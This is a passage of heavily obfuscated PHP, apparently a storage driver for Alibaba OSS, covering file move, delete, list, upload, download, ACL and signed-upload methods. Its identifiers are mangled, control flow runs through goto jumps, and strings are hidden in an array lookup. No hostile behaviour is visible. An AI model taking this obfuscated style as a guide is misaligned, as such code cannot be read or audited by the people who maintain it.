$DÓŒË†Œ„, $this->bucket, $this->pathEncode($eÊÙæ³ßš), $Bì–ÀáÚ™, $fºàö‘Ï¸, $BÛ«ôÛè…); $Bì–ÀáÚ™ = $Bì–ÀáÚ™ + 1; } goto Eø®ö¡Ï¬ß; Eø®ö¡Ï¬ß: $b•¹ß™ßÃ = array(); foreach ($AáºïÌÀªÉ as $EŞæš‚™äõ => $f„×Ôø‰³ù) { $b•¹ß™ßÃ[] = array($bš“ÅÉÔó”[1285] => $EŞæš‚™äõ + 1, $bš“ÅÉÔó”[1286] => $f„×Ôø‰³ù); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($eÊÙæ³ßš), $fºàö‘Ï¸, $b•¹ß™ßÃ); goto E¬†ê¨ìÍñ; E¬†ê¨ìÍñ: } catch (OSS\Core\OssException $eˆƒ…êµ¢Ş) { return !1; } return !0; } public function moveFile($b‰ŠÍØ»ô, $C³ê¹™±’ô) { if ($this->copyFile($b‰ŠÍØ»ô, $C³ê¹™±’ô)) { $this->remove($b‰ŠÍØ»ô); return $this->getPathOuter($C³ê¹™±’ô); } return !1; } public function delFile($dÌóºÉÑÄ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($dÌóºÉÑÄ)); } catch (OSS\Core\OssException $c•–É§ì¼) { return !1; } return !0; } public function delFolder($A‡ã°ÊíË) { goto E‰½ ƒƒ·; DË¥Ú‡Ü­: $d…ñ¯¦£» = $this->fileList($A‡ã°ÊíË); $this->listItemCache = !0; $fî«ó’÷ó‰ = trim($A‡ã°ÊíË, $D–Š‚ÌÇŒ”[8]) . $D–Š‚ÌÇŒ”[8]; goto fÛŒ»Œªì¸; bÑ½òğÛä: return $this->delByBatch($d…ñ¯¦£»[$D–Š‚ÌÇŒ”[74]]); goto d¦•ã©¢Å; fÛŒ»Œªì¸: if (!empty($A‡ã°ÊíË) && !in_array($fî«ó’÷ó‰, $d…ñ¯¦£»[$D–Š‚ÌÇŒ”[74]])) { $d…ñ¯¦£»[$D–Š‚ÌÇŒ”[74]][] = $fî«ó’÷ó‰; } $B§·ãÒæÜ = $this->delByBatch($d…ñ¯¦£»[$D–Š‚ÌÇŒ”[73]]); if (!$B§·ãÒæÜ) { return !1; } goto bÑ½òğÛä; E‰½ ƒƒ·: $D–Š‚ÌÇŒ” =& $_SERVER[…ë˜õ]; if (!$this->exist($A‡ã°ÊíË)) { return !0; } $this->listItemCache = !1; goto DË¥Ú‡Ü­; d¦•ã©¢Å: } private function delByBatch($bš‘Ò„ƒ) { foreach (array_chunk($bš‘Ò„ƒ, 1000) as $Fµ³èãÇÂä) { try { $this->client->deleteObjects($this->bucket, $Fµ³èãÇÂä); } catch (OSS\Core\OssException $C¾±“éÃ»¦) { return !1; } } return !0; } public function rename($fø·Í©·Êõ, $F¾Û¨´’¼ï) { return $this->renameObject($fø·Í©·Êõ, $F¾Û¨´’¼ï); } private function fileInfo($Dµ÷äŠÚ„Ê, $aÑïÆˆ£‚ = false, $CÑÔš×«‚£ = array()) { goto b™Ê–¸°„ì; bîƒáÂ´éë: return $e¤¶–Òî±œ; goto fÄ‹Ô×ÏË„; D®™“ö…ï: if (isset($CÑÔš×«‚£[$bÆ¤›éƒ´ñ[77]])) { $e¤¶–Òî±œ[$bÆ¤›éƒ´ñ[77]] = $CÑÔš×«‚£[$bÆ¤›éƒ´ñ[77]]; } if (isset($CÑÔš×«‚£[$bÆ¤›éƒ´ñ[83]])) { $e¤¶–Òî±œ[$bÆ¤›éƒ´ñ[83]] = $CÑÔš×«‚£[$bÆ¤›éƒ´ñ[83]]; } if (isset($CÑÔš×«‚£[$bÆ¤›éƒ´ñ[195]]) && !trim($e¤¶–Òî±œ[$bÆ¤›éƒ´ñ[83]])) { $e¤¶–Òî±œ[$bÆ¤›éƒ´ñ[83]] = $CÑÔš×«‚£[$bÆ¤›éƒ´ñ[195]]; } goto bîƒáÂ´éë; b™Ê–¸°„ì: $bÆ¤›éƒ´ñ =& $_SERVER[…ë˜õ]; $e¤¶–Òî±œ = array($bÆ¤›éƒ´ñ[28] => $this->pathThis($Dµ÷äŠÚ„Ê), $bÆ¤›éƒ´ñ[75] => $this->getPathOuter($Dµ÷äŠÚ„Ê), $bÆ¤›éƒ´ñ[29] => $bÆ¤›éƒ´ñ[191], $bÆ¤›éƒ´ñ[77] => isset($CÑÔš×«‚£[$bÆ¤›éƒ´ñ[77]]) ? $CÑÔš×«‚£[$bÆ¤›éƒ´ñ[77]] : 0, $bÆ¤›éƒ´ñ[167] => $this->ext($Dµ÷äŠÚ„Ê)); if ($aÑïÆˆ£‚) { return $e¤¶–Òî±œ; } goto b„«ÊŞ±Ë¬; b„«ÊŞ±Ë¬: $e¤¶–Òî±œ[$bÆ¤›éƒ´ñ[192]] = $e¤¶–Òî±œ[$bÆ¤›éƒ´ñ[83]] = 0; $e¤¶–Òî±œ[$bÆ¤›éƒ´ñ[193]] = $e¤¶–Òî±œ[$bÆ¤›éƒ´ñ[194]] = !0; if (empty($CÑÔš×«‚£)) { $fœõŒŒµ¿ = $this->objectMeta($Dµ÷äŠÚ„Ê); if (!$fœõŒŒµ¿) { return $e¤¶–Òî±œ; } $CÑÔš×«‚£ = array($bÆ¤›éƒ´ñ[83] => strtotime($fœõŒŒµ¿[$bÆ¤›éƒ´ñ[1280]]), $bÆ¤›éƒ´ñ[77] => $fœõŒŒµ¿[$bÆ¤›éƒ´ñ[1279]] + 0); } goto D®™“ö…ï; fÄ‹Ô×ÏË„: } private function folderInfo($D±à˜Şí•, $E•êøîËÈ¦ = false, $Bº‰©°…¯Ñ = array()) { goto Dã×¼Ôİ; EÜÙ’¹œæ: $cæÁËØ·ìÏ[$bà¨¶ÊËàÊ[192]] = $cæÁËØ·ìÏ[$bà¨¶ÊËàÊ[83]] = 0; $cæÁËØ·ìÏ[$bà¨¶ÊËàÊ[193]] = $cæÁËØ·ìÏ[$bà¨¶ÊËàÊ[194]] = !0; if (empty($Bº‰©°…¯Ñ)) { $D±à˜Şí• = rtrim($D±à˜Şí•, $bà¨¶ÊËàÊ[8]) . $bà¨¶ÊËàÊ[8]; $fšƒÙ¥ˆ = $this->objectMeta($D±à˜Şí•); if (!$fšƒÙ¥ˆ) { return $cæÁËØ·ìÏ; } $Bº‰©°…¯Ñ = array($bà¨¶ÊËàÊ[192] => $fšƒÙ¥ˆ[$bà¨¶ÊËàÊ[1287]][$bà¨¶ÊËàÊ[1288]], $bà¨¶ÊËàÊ[83] => strtotime($fšƒÙ¥ˆ[$bà¨¶ÊËàÊ[1280]])); } goto Fõé¼ø; Fõé¼ø: if (isset($Bº‰©°…¯Ñ[$bà¨¶ÊËàÊ[83]])) { $cæÁËØ·ìÏ[$bà¨¶ÊËàÊ[83]] = $Bº‰©°…¯Ñ[$bà¨¶ÊËàÊ[83]]; } if (isset($Bº‰©°…¯Ñ[$bà¨¶ÊËàÊ[192]])) { $cæÁËØ·ìÏ[$bà¨¶ÊËàÊ[192]] = $Bº‰©°…¯Ñ[$bà¨¶ÊËàÊ[192]]; } return $cæÁËØ·ìÏ; goto dÖ…Ç¼éÙ; Dã×¼Ôİ: $bà¨¶ÊËàÊ =& $_SERVER[…ë˜õ]; $cæÁËØ·ìÏ = array($bà¨¶ÊËàÊ[28] => $this->pathThis($D±à˜Şí•), $bà¨¶ÊËàÊ[75] => $this->getPathOuter($bà¨¶ÊËàÊ[8] . $D±à˜Şí•), $bà¨¶ÊËàÊ[29] => $bà¨¶ÊËàÊ[76]); if ($E•êøîËÈ¦) { return $cæÁËØ·ìÏ; } goto EÜÙ’¹œæ; dÖ…Ç¼éÙ: } public function listPath($E‡èÌ¿İñ, $C¤²Ï°é Ì = false) { $AÈæœî§Æ =& $_SERVER[…ë˜õ]; $dÔÂ¡Æ”–ò = $this->fileList($E‡èÌ¿İñ, $AÈæœî§Æ[8], !0); foreach ($dÔÂ¡Æ”–ò[$AÈæœî§Æ[74]] as $dê÷ „‰ => $F…Û×™ˆÊš) { $dÔÂ¡Æ”–ò[$AÈæœî§Æ[74]][$dê÷ „‰] = $this->folderInfo($F…Û×™ˆÊš, $C¤²Ï°é Ì, $F…Û×™ˆÊš); } foreach ($dÔÂ¡Æ”–ò[$AÈæœî§Æ[73]] as $dê÷ „‰ => $F…Û×™ˆÊš) { $dÔÂ¡Æ”–ò[$AÈæœî§Æ[73]][$dê÷ „‰] = $this->fileInfo($F…Û×™ˆÊš[$AÈæœî§Æ[28]], $C¤²Ï°é Ì, $F…Û×™ˆÊš); } return $dÔÂ¡Æ”–ò; } public function has($EÈòÅ‚ñŠ, $E¯œœ““ËÃ = false, $c¹ÊÃÓ³›  = true) { goto ağƒ‘ğŞÒÉ; ağƒ‘ğŞÒÉ: $aÄÔ¦‡˜ö˜ =& $_SERVER[…ë˜õ]; $EÈòÅ‚ñŠ = trim($EÈòÅ‚ñŠ, $aÄÔ¦‡˜ö˜[8]); $b›Öù•ØÁ = empty($EÈòÅ‚ñŠ) ? $aÄÔ¦‡˜ö˜[33] : $EÈòÅ‚ñŠ . $aÄÔ¦‡˜ö˜[8]; goto BÖğ´”°ç; CñÛáÍØê¾: while (!0) { check_abort(); $déÏ¼ç³‚· = array($aÄÔ¦‡˜ö˜[1275] => $aÄÔ¦‡˜ö˜[8], $aÄÔ¦‡˜ö˜[1276] => $b›Öù•ØÁ, $aÄÔ¦‡˜ö˜[1277] => $B¾›‰¸òÈ, $aÄÔ¦‡˜ö˜[1278] => $aõ’³‰ëœì); try { $BÁ‰š‰‘ËÎ = $this->client->listObjects($this->bucket, $déÏ¼ç³‚·); } catch (OSS\Core\OssException $Dñ´¬Ã˜ÉÜ) { break; } $aõ’³‰ëœì = $BÁ‰š‰‘ËÎ->getNextMarker(); $F œÚŠ‡Í‘ = $BÁ‰š‰‘ËÎ->getObjectList(); $dï·øÆ…š = $BÁ‰š‰‘ËÎ->getPrefixList(); if ($E¯œœ““ËÃ) { if (count($F œÚŠ‡Í‘) > 1 || count($F œÚŠ‡Í‘) == 1 && $F œÚŠ‡Í‘[0]->getKey() != $b›Öù•ØÁ) { $Bôóš´Ñ¦§ += count($F œÚŠ‡Í‘) - 1; } if (!empty($dï·øÆ…š)) { $F¢ã½Ú‹À += count($dï·øÆ…š); } if ($aõ’³‰ëœì === $aÄÔ¦‡˜ö˜[33]) { break; } continue; } if ($c¹ÊÃÓ³› ) { if (!empty($F œÚŠ‡Í‘)) { if (count($F œÚŠ‡Í‘) > 1 || $F œÚŠ‡Í‘[0]->getKey() != $b›Öù•ØÁ) { return !0; } } } else { if (!empty($dï·øÆ…š)) { return !0; } } if ($aõ’³‰ëœì === $aÄÔ¦‡˜ö˜[33]) { break; } } if ($E¯œœ““ËÃ) { return array($aÄÔ¦‡˜ö˜[201] => $Bôóš´Ñ¦§, $aÄÔ¦‡˜ö˜[202] => $F¢ã½Ú‹À); } return !1; goto b­©˜Æ…›; BÖğ´”°ç: $aõ’³‰ëœì = $aÄÔ¦‡˜ö˜[33]; $B¾›‰¸òÈ = 500; $Bôóš´Ñ¦§ = $F¢ã½Ú‹À = 0; goto CñÛáÍØê¾; b­©˜Æ…›: } public function listAll($C›Œæ‚‹ê¸) { $cœ‚ƒ”‰Õ› =& $_SERVER[…ë˜õ]; $bĞÊä‡‹­ = $this->fileList($C›Œæ‚‹ê¸, $cœ‚ƒ”‰Õ›[33], !0); $cøâ¸ë”á = array(); foreach ($bĞÊä‡‹­[$cœ‚ƒ”‰Õ›[73]] as $cé‡„ä¯›ˆ) { $cøâ¸ë”á[$cé‡„ä¯›ˆ[$cœ‚ƒ”‰Õ›[28]]] = $cé‡„ä¯›ˆ[$cœ‚ƒ”‰Õ›[77]]; } foreach ($bĞÊä‡‹­[$cœ‚ƒ”‰Õ›[74]] as $cé‡„ä¯›ˆ) { if (is_string($cé‡„ä¯›ˆ)) { $cøâ¸ë”á[$cé‡„ä¯›ˆ] = 0; } } return $this->listAllFiles($C›Œæ‚‹ê¸, array_keys($cøâ¸ë”á), $cøâ¸ë”á); } public function canRead($B¯¢çĞèÈĞ) { $eğÌ»™¢„‘ =& $_SERVER[…ë˜õ]; $CøÊÓãÀ°º = $this->pathAcl($B¯¢çĞèÈĞ); return $CøÊÓãÀ°º == $eğÌ»™¢„‘[1289] || $CøÊÓãÀ°º == $eğÌ»™¢„‘[514] ? !0 : !1; } public function canWrite($BÑ®ë÷ø¸) { $e›ª¼¥œÌõ = $this->pathAcl($BÑ®ë÷ø¸); return $e›ª¼¥œÌõ == $_SERVER[…ë˜õ][514] ? !0 : !1; } public function pathAcl($d–Ë´ƒƒ) { goto E¡“îƒÂèî; E¡“îƒÂèî: $aêÉß©¥İ÷ =& $_SERVER[…ë˜õ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $AôŒ§ªå = $this->client->getObjectAcl($this->bucket, $this->pathEncode($d–Ë´ƒƒ)); } catch (OSS\Core\OssException $CäÅÆ‡İÚù) { return !1; } goto AÊÏîéŸ“; D™ï†ÓÑ¼±: return $bÂè„§Ú³•; goto C­Ğ¶Š; AÊÏîéŸ“: $bÂè„§Ú³• = $AôŒ§ªå == $aêÉß©¥İ÷[34] ? $this->bucketAcl : $AôŒ§ªå; if ($bÂè„§Ú³• == $aêÉß©¥İ÷[1290]) { return $aêÉß©¥İ÷[1289]; } if ($bÂè„§Ú³• == $aêÉß©¥İ÷[1291]) { return $aêÉß©¥İ÷[514]; } goto D™ï†ÓÑ¼±; C­Ğ¶Š: } private function chmodPath($D·ˆ³º¾, $FÀ»“Ëù‰ = '') { $f¬‹˜Ê™Ñ‰ =& $_SERVER[…ë˜õ]; $aË£áå„·³ = empty($FÀ»“Ëù‰) ? $f¬‹˜Ê™Ñ‰[1291] : $FÀ»“Ëù‰; $A›İŒµæµ‰ = array($f¬‹˜Ê™Ñ‰[34], $f¬‹˜Ê™Ñ‰[190], $f¬‹˜Ê™Ñ‰[1290], $f¬‹˜Ê™Ñ‰[1291]); if (!in_array($aË£áå„·³, $A›İŒµæµ‰)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($D·ˆ³º¾), $aË£áå„·³); } catch (OSS\Core\OssException $CğœğàÛ¹ª) { return !1; } return !0; } public function getContent($eÙÆ†Î‰–í) { return $this->fileSubstr($eÙÆ†Î‰–í, -1); } public function setContent($F„èØ²âÎƒ, $B“Ê§ÒÏ¼ñ = '') { $Bˆ¤´¦—÷Ò =& $_SERVER[…ë˜õ]; try { $D¼—ù¾Êì = $this->trafficLimit($Bˆ¤´¦—÷Ò[1292]); $aôÈÓš©ƒà = $this->client->putObject($this->bucket, $this->pathEncode($F„èØ²âÎƒ), $B“Ê§ÒÏ¼ñ, $D¼—ù¾Êì); } catch (OSS\Core\OssException $DŞ·ê¢µåù) { return !1; } $d…Ò‰ùá©µ = array($Bˆ¤´¦—÷Ò[1281] => trim($aôÈÓš©ƒà[$Bˆ¤´¦—÷Ò[1293]], $Bˆ¤´¦—÷Ò[115]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($F„èØ²âÎƒ))); $this->updateObjMeta($F„èØ²âÎƒ, $d…Ò‰ùá©µ); return isset($aôÈÓš©ƒà[$Bˆ¤´¦—÷Ò[1294]][$Bˆ¤´¦—÷Ò[1240]]) ? !0 : !1; } private function updateObjMeta($eÒ­¨Î£•, $FîÅ ¶˜¯É) { $eÒ­¨Î£• = $this->pathEncode($eÒ­¨Î£•); try { $b×Ó÷Ûì‡ƒ = array(OSS\OssClient::OSS_HEADERS => $FîÅ ¶˜¯É); $this->client->copyObject($this->bucket, $eÒ­¨Î£•, $this->bucket, $eÒ­¨Î£•, $b×Ó÷Ûì‡ƒ); } catch (OSS\Core\OssException $BÃ’×ÇØ) { return !1; } return !0; } public function upload($BÁÛ¯”, $EƒÃ©ÆÌ½´, $a‰‡âÌ’† = false, $aÁ‰—Æ = REPEAT_REPLACE) { $a°ÜÑÚ¨â¸ =& $_SERVER[…ë˜õ]; $Eå´“ß¶Š» = trim($BÁÛ¯”, $a°ÜÑÚ¨â¸[8]); $E×ÀÄ‘À‡ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($a°ÜÑÚ¨â¸[1281] => @md5_file($EƒÃ©ÆÌ½´)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($BÁÛ¯”))); $E×ÀÄ‘À‡ = $this->trafficLimit($a°ÜÑÚ¨â¸[1292], $E×ÀÄ‘À‡); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($Eå´“ß¶Š»), $EƒÃ©ÆÌ½´, $E×ÀÄ‘À‡); } catch (OSS\Core\OssException $E‘ÌÀ®œÊ½) { return !1; } return $this->getPathOuter($BÁÛ¯”); } public function getHost() { $bÕÂÎéÄ¤ê =& $_SERVER[…ë˜õ]; $E¿®‹ŒÖâ = explode($bÕÂÎéÄ¤ê[176], parent::getHost()); return $E¿®‹ŒÖâ[0] . $bÕÂÎéÄ¤ê[176] . $this->bucket . $bÕÂÎéÄ¤ê[94] . $E¿®‹ŒÖâ[1]; } public function uploadFormData($AÌÍÁ…ˆÙÒ, $DŒ‡„„äÒ = 3600) { goto fİáº‚ÀÅø; fİáº‚ÀÅø: $FÖ¬‚£ñËµ =& $_SERVER[…ë˜õ]; if (!($FàÔÏ•öØ£ = $this->getHost())) { return !1; } $DŞ¨Ìõ® = $DŒ‡„„äÒ; goto A÷ ¯»‘Ü; bôâ¾µÔÜ: $AË¨¨øßö = base64_encode(hash_hmac($FÖ¬‚£ñËµ[228], $e‚°„ŸÁ°, $this->secret, !0)); $B…¬´§å¶ = array($FÖ¬‚£ñËµ[1204] => $e‚°„ŸÁ°, $FÖ¬‚£ñËµ[1298] => $this->accessKey, $FÖ¬‚£ñËµ[1200] => $FÖ¬‚£ñËµ[1192], $FÖ¬‚£ñËµ[1299] => $AË¨¨øßö, $FÖ¬‚£ñËµ[174] => $FàÔÏ•öØ£); $B…¬´§å¶ = $this->trafficLimit($FÖ¬‚£ñËµ[1292], $B…¬´§å¶); goto F‡—„íÚ²; bÀÖÖ¨™ª: $A×Ëñ®‰‹– = strpos($A¼Ú´™½•, $FÖ¬‚£ñËµ[292]); $A¼Ú´™½• = substr($A¼Ú´™½•, 0, $A×Ëñ®‰‹–) . $FÖ¬‚£ñËµ[1296]; $a‘ˆÈ¿ÃÈ = 1048576000 * 5; goto C’’Èİš„î; C’’Èİš„î: $Bê½èÜ£Æ§ = $this->pathFather($AÌÍÁ…ˆÙÒ); $døá†âç¢‹ = array($FÖ¬‚£ñËµ[1194] => $A¼Ú´™½•, $FÖ¬‚£ñËµ[1195] => array(array($FÖ¬‚£ñËµ[1297], 0, $a‘ˆÈ¿ÃÈ), array($FÖ¬‚£ñËµ[1198], $FÖ¬‚£ñËµ[1199], $Bê½èÜ£Æ§))); $e‚°„ŸÁ° = base64_encode(json_encode($døá†âç¢‹)); goto bôâ¾µÔÜ; F‡—„íÚ²: return $B…¬´§å¶; goto fÏË¨×í; A÷ ¯»‘Ü: $EöªÚÕ¸ªÑ = date($FÖ¬‚£ñËµ[1295], time() + $DŞ¨Ìõ®); $CÅë¸™Å½ò = new DateTime($EöªÚÕ¸ªÑ); $A¼Ú´™½• = $CÅë¸™Å½ò->format(DateTime::ISO8601); goto bÀÖÖ¨™ª; fÏË¨×í: } public function multiUploadFormData($bÍ“‘›ŒùÀ, $a­²ˆŒ¯§ã = 3600) { $E¢šê¥’ë÷ =& $_SERVER[…ë˜õ]; if (!($eâó½‰‡Ä„ = $this->getHost())) { return !1; } $Eâ™êÄèè = $this->trafficLimit($E¢šê¥’ë÷[1292]); $Bê½•à˜õ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($bÍ“‘›ŒùÀ), $Eâ™êÄèè); return array($E¢šê¥’ë÷[219] => $Bê½•à˜õ, $E¢šê¥’ë÷[174] => $eâó½‰‡Ä„ . $E¢šê¥’ë÷[8] . $this->pathEncode($bÍ“‘›ŒùÀ), $E¢šê¥’ë÷[220] => gmdate($E¢šê¥’ë÷[1300]), $E¢šê¥’ë÷[92] => $bÍ“‘›ŒùÀ); } public function multiUploadAuthData($f á®êÅ§â, $D¤—¨§ÜË» = array()) { goto Cä×Ä‚èÈç; e›¨„ó›†: $C“İ¿¦½º¼ = $f á®êÅ§â; if (isset($D¤—¨§ÜË»[$fœË÷ÀÉ’¡[92]])) { $C“İ¿¦½º¼ = $D¤—¨§ÜË»[$fœË÷ÀÉ’¡[92]]; unset($D¤—¨§ÜË»[$fœË÷ÀÉ’¡[92]]); } if (isset($D¤—¨§ÜË»[$fœË÷ÀÉ’¡[221]])) { $D¤—¨§ÜË»[$fœË÷ÀÉ’¡[220]] = $bâ¬—ëäãÅ; return $this->listUploadParts($C“İ¿¦½º¼, $D¤—¨§ÜË»); } goto E´´ã‚º³ƒ; e­ –Ö‰­ó: $D±çÆó¤·¸ = $fœË÷ÀÉ’¡[1265] . $this->accessKey . $fœË÷ÀÉ’¡[4] . $BÉ”™ŸÆÓÍ; if (strpos($b¡’òŒã¨ª, $fœË÷ÀÉ’¡[223]) === 0) { $D±çÆó¤·¸ = array($fœË÷ÀÉ’¡[230] => $D±çÆó¤·¸, $fœË÷ÀÉ’¡[220] => $bâ¬—ëäãÅ); if ($cªÁ…šğÀÑ) { $D±çÆó¤·¸ = array_merge($D±çÆó¤·¸, $cªÁ…šğÀÑ); } } return $D±çÆó¤·¸; goto e«ğÉÉ´×ğ; E´´ã‚º³ƒ: $cĞàƒâæ = array($fœË÷ÀÉ’¡[222], $fœË÷ÀÉ’¡[33], $fœË÷ÀÉ’¡[118], $bâ¬—ëäãÅ, "\170\55\x6f\x73\163\55\144\141\164\145\72{$bâ¬—ëäãÅ}", $fœË÷ÀÉ’¡[8] . $this->bucket . $fœË÷ÀÉ’¡[8] . $C“İ¿¦½º¼ . $b¡’òŒã¨ª); if (strpos($b¡’òŒã¨ª, $fœË÷ÀÉ’¡[223]) === 0) { $cĞàƒâæ[0] = $fœË÷ÀÉ’¡[224]; if ($cªÁ…šğÀÑ = $this->trafficLimit($fœË÷ÀÉ’¡[1292])) { $C“İ¿¦½º¼ = $fœË÷ÀÉ’¡[1301]; array_splice($cĞàƒâæ, 5, 0, $C“İ¿¦½º¼ . $fœË÷ÀÉ’¡[4] . $cªÁ…šğÀÑ[$C“İ¿¦½º¼]); } } if (isset($D¤—¨§ÜË»[$fœË÷ÀÉ’¡[225]]) && $D¤—¨§ÜË»[$fœË÷ÀÉ’¡[225]] == $fœË÷ÀÉ’¡[226]) { $cĞàƒâæ[0] = $fœË÷ÀÉ’¡[226]; } goto fÍ—Ó•ĞÑƒ; fÍ—Ó•ĞÑƒ: if (!empty($D¤—¨§ÜË»[$fœË÷ÀÉ’¡[1302]])) { $eĞ¦˜â‡‚ = array_merge(array($cĞàƒâæ[4]), $D¤—¨§ÜË»[$fœË÷ÀÉ’¡[1302]]); sort($eĞ¦˜â‡‚); $cĞàƒâæ[4] = implode($fœË÷ÀÉ’¡[227], $eĞ¦˜â‡‚); } $bóËƒ´ôˆš = implode($fœË÷ÀÉ’¡[227], $cĞàƒâæ); $BÉ”™ŸÆÓÍ = base64_encode(hash_hmac($fœË÷ÀÉ’¡[228], $bóËƒ´ôˆš, $this->secret, !0)); goto e­ –Ö‰­ó; Cä×Ä‚èÈç: $fœË÷ÀÉ’¡ =& $_SERVER[…ë˜õ]; $bâ¬—ëäãÅ = isset($D¤—¨§ÜË»[$fœË÷ÀÉ’¡[220]]) ? $D¤—¨§ÜË»[$fœË÷ÀÉ’¡[220]] : gmdate($fœË÷ÀÉ’¡[1300]); $b¡’òŒã¨ª = isset($D¤—¨§ÜË»[$fœË÷ÀÉ’¡[167]]) ? $D¤—¨§ÜË»[$fœË÷ÀÉ’¡[167]] : $fœË÷ÀÉ’¡[33]; goto e›¨„ó›†; e«ğÉÉ´×ğ: } public function listUploadParts($Fá¦©Àæ›ö, $DæµâÆóÏ²) { goto fÏ‘ÈŒÇçÄ; cÌÂ¯Ú‡åš: $f‡ÄìÛ¸ÜÖ = $DÈ±Ó†ƒ¥Æ->getListPart(); $B”æ²ùñµÚ = array(); foreach ($f‡ÄìÛ¸ÜÖ as $EŞâ…Ö‰¶) { $B”æ²ùñµÚ[] = array($FªÃÏ®Åõ•[1285] => $EŞâ…Ö‰¶->getPartNumber(), $FªÃÏ®Åõ•[1286] => trim($EŞâ…Ö‰¶->getETag(), $FªÃÏ®Åõ•[115])); } goto CÕ¥²‘à“é; FŞ•ÈÉéÀì: return array($FªÃÏ®Åõ•[230] => $dÅÁ­‘Ø“Œ, $FªÃÏ®Åõ•[220] => $DæµâÆóÏ²[$FªÃÏ®Åõ•[220]], $FªÃÏ®Åõ•[232] => $B”æ²ùñµÚ); goto cËºßÉÎ°; fÏ‘ÈŒÇçÄ: $FªÃÏ®Åõ• =& $_SERVER[…ë˜õ]; $d…¼¼¬ª±Ö = parse_url_query($DæµâÆóÏ²[$FªÃÏ®Åõ•[167]]); $DÈ±Ó†ƒ¥Æ = $this->client->listParts($this->bucket, $this->pathEncode($Fá¦©Àæ›ö), $d…¼¼¬ª±Ö[$FªÃÏ®Åõ•[219]]); goto cÌÂ¯Ú‡åš; CÕ¥²‘à“é: unset($DæµâÆóÏ²[$FªÃÏ®Åõ•[221]], $DæµâÆóÏ²[$FªÃÏ®Åõ•[225]]); $dÅÁ­‘Ø“Œ = $this->multiUploadAuthData($Fá¦©Àæ›ö, $DæµâÆóÏ²); if (empty($dÅÁ­‘Ø“Œ)) { return !1; } goto FŞ•ÈÉéÀì; cËºßÉÎ°: } public function download($c‘›˜–Ò·, $D¹÷åÁÓç¯) { if ($this->isFolder($c‘›˜–Ò·)) { return !1; } try { $f´¥™«©æì = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $D¹÷åÁÓç¯); $f´¥™«©æì = $this->trafficLimit($_SERVER[…ë˜õ][108], $f´¥™«©æì); $this->client->getObject($this->bucket, $this->pathEncode($c‘›˜–Ò·), $f´¥™«©æì); } catch (OSS\Core\OssException $d÷›œ¡šÏµ) { return !1; } return $D¹÷åÁÓç¯; } public function fileSubstr($C¥Ø¶Ê‚ªå, $d®×ÀË‚µ = 0, $bœ§¶Š¼ÍË = false) { if ($d®×ÀË‚µ === -1) { $A¥¶Ï½Õ–è = array(); } else { if ($bœ§¶Š¼ÍË === !1) { $D¢ Š›ä³ = $this->size($C¥Ø¶Ê‚ªå); } else { $D¢ Š›ä³ = $d®×ÀË‚µ + $bœ§¶Š¼ÍË - 1; } $A¥¶Ï½Õ–è = array(OSS\OssClient::OSS_RANGE => "{$d®×ÀË‚µ}\55{$D¢ Š›ä³}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($C¥Ø¶Ê‚ªå), $A¥¶Ï½Õ–è); } catch (OSS\Core\OssException $aÒÖÚ–æ«Ö) { think_exception($aÒÖÚ–æ«Ö->getMessage()); return !1; } } private function trafficLimit($f™†´ÎîÀ, $EñÕÖèªÌ = array()) { goto DÚŞ†à—…‹; DÚŞ†à—…‹: $cÉ±àšå =& $_SERVER[…ë˜õ]; if ($f™†´ÎîÀ == $cÉ±àšå[1292] && $this->isUploadServer() || $f™†´ÎîÀ == $cÉ±àšå[108] && $this->isFileOutServer()) { return $EñÕÖèªÌ; } $B£˜ƒî§ = floatval($GLOBALS[$cÉ±àšå[6]][$cÉ±àšå[87]][$cÉ±àšå[106]][$f™†´ÎîÀ]) * 1024 * 1024 * 8; goto e‹—”ÃÕ¬; e‹—”ÃÕ¬: if (!$B£˜ƒî§) { return $EñÕÖèªÌ; } $B£˜ƒî§ = $B£˜ƒî§ < 819200 ? 819200 : ($B£˜ƒî§ > 838860800 ? 838860800 : $B£˜ƒî§); $EñÕÖèªÌ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($B£˜ƒî§); goto e•×šŒâ; e•×šŒâ: return $EñÕÖèªÌ; goto eƒ¡æ†Â„; eƒ¡æ†Â„: } public function link($dÜÚ˜ÚÒì, $fÅµ¯¸£º = array()) { $döÜå³áØ´ =& $_SERVER[…ë˜õ]; if (!$this->exist($dÜÚ˜ÚÒì) || $this->isFolder($dÜÚ˜ÚÒì)) { return !1; } try { $fÅµ¯¸£º = $this->trafficLimit($döÜå³áØ´[108], $fÅµ¯¸£º); $dƒäË·ƒò = $this->client->signUrl($this->bucket, $this->pathEncode($dÜÚ˜ÚÒì), 3600 * 12, $döÜå³áØ´[226], $fÅµ¯¸£º); return $this->getCdnLink($dƒäË·ƒò); } catch (OSS\Core\OssException $bãÇ¦½†) { return !1; } } public function fileOut($c‘ÛîºÁÀï, $bŸƒë§¨™ƒ = false, $b»Â´³ŠØÁ = false, $C³ í¬âù… = '') { goto cİÌ¥­ñó; cİÌ¥­ñó: $e¤êÍ‡¤Ó« =& $_SERVER[…ë˜õ]; if ($this->isFileOutServer()) { return $this->fileOutServer($c‘ÛîºÁÀï, $bŸƒë§¨™ƒ, $b»Â´³ŠØÁ, $C³ í¬âù…); } if (!$b»Â´³ŠØÁ) { $b»Â´³ŠØÁ = $this->pathThis($c‘ÛîºÁÀï); } goto eÎ†ÙœÒÍ; D¹½÷„†õ‘: $E¶ê…÷™Ö± = $this->link($c‘ÛîºÁÀï, $BáÚ†µ²è); $this->fileOutLink($E¶ê…÷™Ö±); goto bëå¹Ñ“Í; eÎ†ÙœÒÍ: $b»Â´³ŠØÁ = rawurlencode($b»Â´³ŠØÁ); $AÙˆé†„œ = get_file_mime(get_path_ext($b»Â´³ŠØÁ)); if ($AÙˆé†„œ == $e¤êÍ‡¤Ó«[211]) { return 